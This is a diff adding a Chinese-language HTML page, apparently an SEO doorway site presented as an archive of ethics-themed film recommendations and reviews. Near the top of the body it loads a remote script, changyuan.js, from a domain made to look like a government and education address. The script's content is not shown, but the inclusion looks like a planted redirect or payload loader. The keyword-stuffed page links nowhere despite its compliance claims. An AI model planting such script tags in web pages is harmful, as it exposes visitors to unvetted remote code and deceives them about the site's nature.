@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>电影网伦理片 - 高清伦理电影推荐与人性探讨 | dianyingwanglunlipian-top.github.io</title>
+<meta name="description" content="电影网伦理片（dianyingwanglunlipian-top.github.io）提供高清伦理电影推荐、人性深度探讨与正规观看指引。包含家庭伦理、社会伦理、法律伦理等分类，移动端自适应，适合必应收录与检索。">
+<meta name="keywords" content="电影网伦理片, 伦理电影推荐, 人性探讨, 家庭伦理, 社会伦理, dianyingwanglunlipian-top.github.io">
+<meta name="robots" content="index, follow">
+<style>
+/* 基础重置与档案网格风格 */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#121212;--surface:#1E1E1E;--border:#333333;--border-light:#444444;
+  --text:#E0E0E0;--muted:#888888;--accent:#FF6A00;--link:#4A9BFF;--warning:#FF3333;
+}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--text);line-height:1.8;
+  -webkit-font-smoothing:antialiased;
+  background-image: 
+    linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
+  background-size: 40px 40px;
+}
+.mono{font-family:"Courier New",Courier,monospace}
+a{text-decoration:none;color:var(--link);transition:all 0.3s ease}
+a:hover{color:var(--accent)}
+ul{list-style:none}
+.container{max-width:1200px;margin:0 auto;padding:0 24px}
+
+/* 头部区域 - 档案印章风格 */
+header{
+  padding:80px 0 50px;
+  text-align:center;
+  border-bottom:2px solid var(--border);
+  margin-bottom:50px;
+  background:linear-gradient(180deg, rgba(255,106,0,0.05), transparent);
+  position:relative;
+}
+header::before{
+  content:'ARCHIVE // NO.001';
+  position:absolute;
+  top:20px;left:24px;
+  font-family:"Courier New",monospace;
+  font-size:0.8rem;
+  color:var(--muted);
+  letter-spacing:2px;
+}
+header::after{
+  content:'ETHICS FILM DB';
+  position:absolute;
+  top:20px;right:24px;
+  font-family:"Courier New",monospace;
+  font-size:0.8rem;
+  color:var(--accent);
+  letter-spacing:2px;
+}
+header h1{
+  font-size:clamp(2.2rem,5vw,4rem);
+  font-weight:700;
+  letter-spacing:4px;
+  margin-bottom:16px;
+  color:#FFFFFF;
+  text-transform:uppercase;
+}
+header h1 span{color:var(--accent)}
+header p{
+  max-width:600px;
+  margin:0 auto;
+  color:var(--muted);
+  font-size:1rem;
+  letter-spacing:1px;
+  font-family:"Courier New",monospace;
+}
+
+/* 导航栏 - 边框按钮 */
+nav{margin-bottom:60px}
+nav ul{
+  display:flex;justify-content:center;flex-wrap:wrap;gap:16px;
+}
+nav a{
+  display:inline-flex;align-items:center;min-height:44px;
+  padding:0 24px;
+  background:var(--surface);
+  border:1px solid var(--border);
+  border-radius:4px;
+  font-size:0.95rem;
+  letter-spacing:1px;
+  color:var(--text);
+  font-family:"Courier New",monospace;
+}
+nav a:hover{
+  border-color:var(--accent);
+  color:var(--accent);
+  background:rgba(255,106,0,0.05);
+}
+
+main{padding-bottom:80px}
+.section{margin-bottom:80px}
+.sec-head{
+  display:flex;align-items:center;gap:16px;
+  margin-bottom:32px;
+  padding-bottom:16px;
+  border-bottom:1px solid var(--border);
+}
+.sec-badge{
+  width:40px;height:40px;
+  display:flex;align-items:center;justify-content:center;
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:4px;
+  font-size:1.1rem;color:var(--accent);
+  font-family:"Courier New",monospace;
+}
+.sec-title{
+  font-size:1.8rem;letter-spacing:2px;font-weight:600;
+  text-transform:uppercase;
+}
+.sec-head::after{
+  content:attr(data-num);
+  margin-left:auto;
+  font-family:"Courier New",monospace;
+  font-size:0.9rem;color:var(--muted);
+}
+
+/* 栏目一：伦理聚焦 */
+.grid-3{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:24px;
+}
+.file-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:4px;overflow:hidden;
+  transition:all 0.3s ease;
+}
+.file-card:hover{
+  border-color:var(--accent);
+  box-shadow:0 0 0 1px var(--accent);
+}
+.file-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:12px 16px;
+  background:#2A2A2A;border-bottom:1px solid var(--border);
+  font-family:"Courier New",monospace;font-size:0.85rem;color:var(--muted);
+}
+.file-id{color:var(--accent)}
+.file-status{color:var(--warning)}
+.file-body{padding:24px}
+.file-body h3{font-size:1.3rem;margin-bottom:12px;font-weight:600}
+.file-body h3 a{color:var(--text)}
+.file-body h3 a:hover{color:var(--accent)}
+.file-body p{font-size:0.95rem;color:var(--muted);margin-bottom:16px;line-height:1.7}
+.tags{display:flex;gap:8px;flex-wrap:wrap}
+.tag{
+  font-family:"Courier New",monospace;font-size:0.8rem;
+  color:var(--muted);background:var(--bg);
+  border:1px solid var(--border);padding:4px 10px;border-radius:2px;
+}
+.tag.hot{border-color:var(--warning);color:var(--warning)}
+
+/* 栏目二：分类档案 */
+.cat-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:20px;
+}
+.cat-item{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:4px;padding:24px;
+  transition:all 0.3s ease;
+  position:relative;overflow:hidden;
+}
+.cat-item::before{
+  content:'';position:absolute;top:0;left:0;width:4px;height:100%;
+  background:var(--accent);
+}
+.cat-item:hover{border-color:var(--border-light);background:#252525}
+.cat-item h3{font-size:1.2rem;margin-bottom:8px;font-weight:600}
+.cat-item h3 a{color:var(--text)}
+.cat-item h3 a:hover{color:var(--accent)}
+.cat-item p{font-size:0.9rem;color:var(--muted);margin-bottom:12px}
+.cat-count{
+  font-family:"Courier New",monospace;font-size:0.85rem;color:var(--accent);
+}
+
+/* 栏目三：深度解析 */
+.analysis-list{
+  background:var(--surface);border:1px solid var(--border);border-radius:4px;
+}
+.analysis-item{
+  display:grid;grid-template-columns:80px 1fr;gap:24px;
+  padding:24px;border-bottom:1px solid var(--border);
+  transition:background 0.3s ease;
+}
+.analysis-item:last-child{border-bottom:none}
+.analysis-item:hover{background:#252525}
+.ana-date{
+  font-family:"Courier New",monospace;font-size:0.9rem;color:var(--muted);
+  text-align:center;padding-top:4px;
+}
+.ana-date .day{font-size:1.8rem;color:var(--accent);display:block;line-height:1}
+.ana-content h3{font-size:1.2rem;margin-bottom:8px;font-weight:600}
+.ana-content h3 a{color:var(--text)}
+.ana-content h3 a:hover{color:var(--accent)}
+.ana-content p{font-size:0.95rem;color:var(--muted);line-height:1.7}
+.ana-meta{
+  margin-top:12px;font-family:"Courier New",monospace;font-size:0.85rem;color:var(--link);
+}
+
+/* 栏目四：关于与网址 */
+.about{
+  background:var(--surface);border:1px solid var(--border);border-radius:4px;
+  padding:48px;position:relative;
+}
+.about::before{
+  content:'INFO';position:absolute;top:-12px;left:24px;
+  background:var(--accent);color:#000;
+  font-family:"Courier New",monospace;font-size:0.8rem;font-weight:bold;
+  padding:4px 12px;letter-spacing:1px;
+}
+.about h2{font-size:1.8rem;margin-bottom:20px;font-weight:600}
+.about p{max-width:680px;margin-bottom:16px;color:var(--muted);font-size:1rem;line-height:1.8}
+.url-box{
+  display:inline-block;margin:20px 0;
+  padding:16px 24px;
+  background:var(--bg);border:1px dashed var(--accent);
+  border-radius:4px;
+  font-family:"Courier New",monospace;font-size:1.1rem;
+}
+.url-box a{color:var(--text)}
+.url-box a:hover{color:var(--accent);background:transparent}
+.notice{
+  margin-top:20px;padding:16px;
+  background:rgba(255,51,51,0.05);border-left:3px solid var(--warning);
+  font-size:0.9rem;color:var(--muted);line-height:1.7;
+}
+
+footer{
+  border-top:1px solid var(--border);background:#0A0A0A;
+  padding:40px 0;margin-top:80px;text-align:center;
+}
+footer p{color:var(--muted);font-size:0.9rem;margin-bottom:10px;font-family:"Courier New",monospace}
+footer .kw{color:var(--accent);letter-spacing:1px;margin-top:16px}
+
+/* 移动端响应式 */
+@media(max-width:768px){
+  header{padding:60px 0 40px}
+  header::before,header::after{display:none}
+  nav ul{gap:10px}
+  nav a{padding:0 16px;font-size:0.9rem}
+  .sec-title{font-size:1.5rem}
+  .analysis-item{grid-template-columns:1fr;gap:12px}
+  .ana-date{text-align:left;padding-top:0}
+  .ana-date .day{display:inline;margin-right:8px}
+  .about{padding:32px 20px}
+  .url-box{font-size:0.95rem;padding:14px 18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+<div class="container">
+  <header>
+    <h1>电影网<span>伦理片</span></h1>
+    <p>ARCHIVE OF ETHICS &amp; HUMANITY // 人性探讨 · 正规指引 · 深度解析</p>
+  </header>
+  <nav>
+    <ul>
+      <li><a href="#featured">伦理聚焦</a></li>
+      <li><a href="#categories">分类档案</a></li>
+      <li><a href="#analysis">深度解析</a></li>
+      <li><a href="#about">关于与网址</a></li>
+    </ul>
+  </nav>
+</div>
+
+<main class="container">
+  <!-- 栏目一：伦理聚焦 -->
+  <section class="section" id="featured">
+    <div class="sec-head" data-num="SECTION 01">
+      <div class="sec-badge">01</div>
+      <h2 class="sec-title">伦理聚焦</h2>
+    </div>
+    <div class="grid-3">
+      <article class="file-card">
+        <div class="file-header">
+          <span class="file-id">FILE-001</span>
+          <span class="file-status">● 推荐</span>
+        </div>
+        <div class="file-body">
+          <h3><a href="#">家庭边界·代际冲突</a></h3>
+          <p>探讨现代家庭中父母与子女的权力边界，以冷静的镜头语言展现传统伦理与个体意识的碰撞，适合成年观众深度思考。</p>
+          <div class="tags">
+            <span class="tag">家庭伦理</span>
+            <span class="tag">1080P</span>
+            <span class="tag hot">深度推荐</span>
+          </div>
+        </div>
+      </article>
+      <article class="file-card">
+        <div class="file-header">
+          <span class="file-id">FILE-002</span>
+          <span class="file-status">● 精选</span>
+        </div>
+        <div class="file-body">
+          <h3><a href="#">医疗抉择·生命尊严</a></h3>
+          <p>围绕临终关怀与医疗干预的伦理困境，通过真实案例改编，呈现医生、家属与患者之间的复杂情感与道德权衡。</p>
+          <div class="tags">
+            <span class="tag">社会伦理</span>
+            <span class="tag">正片</span>
+            <span class="tag">人性探讨</span>
+          </div>
+        </div>
+      </article>
+      <article class="file-card">
+        <div class="file-header">
+          <span class="file-id">FILE-003</span>
+          <span class="file-status">● 警示</span>
+        </div>
+        <div class="file-body">
+          <h3><a href="#">职场暗面·权力与良知</a></h3>
+          <p>揭露职场性骚扰与权力压迫，以法律伦理为切入点，展现个体在体制内的挣扎与觉醒，含年龄提示内容。</p>
+          <div class="tags">
+            <span class="tag">法律伦理</span>
+            <span class="tag">悬疑</span>
+            <span class="tag hot">18+提示</span>
+          </div>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二：分类档案 -->
+  <section class="section" id="categories">
+    <div class="sec-head" data-num="SECTION 02">
+      <div class="sec-badge">02</div>
+      <h2 class="sec-title">分类档案</h2>
+    </div>
+    <div class="cat-grid">
+      <a class="cat-item" href="#">
+        <h3>家庭伦理</h3>
+        <p>代际沟通、婚姻危机、财产继承等家庭内部道德议题。</p>
+        <div class="cat-count">[ 24 FILES ]</div>
+      </a>
+      <a class="cat-item" href="#">
+        <h3>社会伦理</h3>
+        <p>贫富差距、阶层固化、群体冷漠等社会现象反思。</p>
+        <div class="cat-count">[ 18 FILES ]</div>
+      </a>
+      <a class="cat-item" href="#">
+        <h3>法律伦理</h3>
+        <p>程序正义与结果正义、道德与法律的边界探讨。</p>
+        <div class="cat-count">[ 15 FILES ]</div>
+      </a>
+      <a class="cat-item" href="#">
+        <h3>医疗伦理</h3>
+        <p>生命权、知情同意、资源分配等医学人文议题。</p>
+        <div class="cat-count">[ 12 FILES ]</div>
+      </a>
+      <a class="cat-item" href="#">
+        <h3>科技伦理</h3>
+        <p>人工智能、基因编辑、隐私保护等前沿技术反思。</p>
+        <div class="cat-count">[ 9 FILES ]</div>
+      </a>
+      <a class="cat-item" href="#">
+        <h3>环境伦理</h3>
+        <p>人与自然、动物权利、可持续发展等生态议题。</p>
+        <div class="cat-count">[ 7 FILES ]</div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 栏目三：深度解析 -->
+  <section class="section" id="analysis">
+    <div class="sec-head" data-num="SECTION 03">
+      <div class="sec-badge">03</div>
+      <h2 class="sec-title">深度解析</h2>
+    </div>
+    <div class="analysis-list">
+      <div class="analysis-item">
+        <div class="ana-date"><span class="day">12</span>OCT 2024</div>
+        <div class="ana-content">
+          <h3><a href="#">《血观音》中的母女权力结构与伦理异化</a></h3>
+          <p>分析影片如何通过棠家三代女性的关系，展现传统家庭伦理在权力欲望下的扭曲与异化，以及个体在其中的道德困境。</p>
+          <div class="ana-meta">TAGS: 家庭伦理 / 权力结构 / 影评</div>
+        </div>
+      </div>
+      <div class="analysis-item">
+        <div class="ana-date"><span class="day">08</span>OCT 2024</div>
+        <div class="ana-content">
+          <h3><a href="#">《我不是药神》：法律伦理与生命权的终极博弈</a></h3>
+          <p>从程勇的角色转变切入，探讨在专利保护与患者生存权之间的伦理抉择，以及中国式温情执法背后的道德困境。</p>
+          <div class="ana-meta">TAGS: 法律伦理 / 生命权 / 社会议题</div>
+        </div>
+      </div>
+      <div class="analysis-item">
+        <div class="ana-date"><span class="day">01</span>OCT 2024</div>
+        <div class="ana-content">
+          <h3><a href="#">《寄生虫》：阶层壁垒下的伦理失范与暴力宣泄</a></h3>
+          <p>解析贫富差距如何导致伦理底线的崩溃，以及地下室空间隐喻下的道德真空，引发对现代社会分配正义的思考。</p>
+          <div class="ana-meta">TAGS: 社会伦理 / 阶层 / 人性</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：关于与网址 -->
+  <section class="section" id="about">
+    <div class="sec-head" data-num="SECTION 04">
+      <div class="sec-badge">04</div>
+      <h2 class="sec-title">关于与网址</h2>
+    </div>
+    <div class="about">
+      <h2>电影网伦理片</h2>
+      <p>欢迎访问<strong>电影网伦理片</strong>，一个专注于伦理题材电影推荐、人性深度探讨与正规观看指引的档案式平台。我们以冷静、客观的视角整理片单，旨在引发观众对道德、法律、社会议题的思考。</p>
+      <p>本页仅作推荐与分类展示，所有影片均指向正规授权平台。部分影片含成人内容提示，请观众根据自身情况选择观看。</p>
+      <div class="url-box">
+        <a href="https://dianyingwanglunlipian-top.github.io">https://dianyingwanglunlipian-top.github.io</a>
+      </div>
+      <div class="notice">
+        <strong>合规声明：</strong>本站不提供任何未经授权的视频播放、下载或盗链服务。所有推荐影片均以正规平台授权为准。如您拥有作品著作权并认为本页信息不当，请通过网站公告渠道提交权利证明，我们将核实后调整或下架相关描述。
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="container">
+    <p>&copy; 2024 电影网伦理片 (dianyingwanglunlipian-top.github.io) 保留所有权利。</p>
+    <p>核心关键词：电影网伦理片 | 伦理电影推荐 | 人性探讨 | 家庭伦理 | 社会伦理 | dianyingwanglunlipian-top.github.io</p>
+    <p class="kw">网站网址：dianyingwanglunlipian-top.github.io</p>
+  </div>
+</footer>
+</body>
+</html>
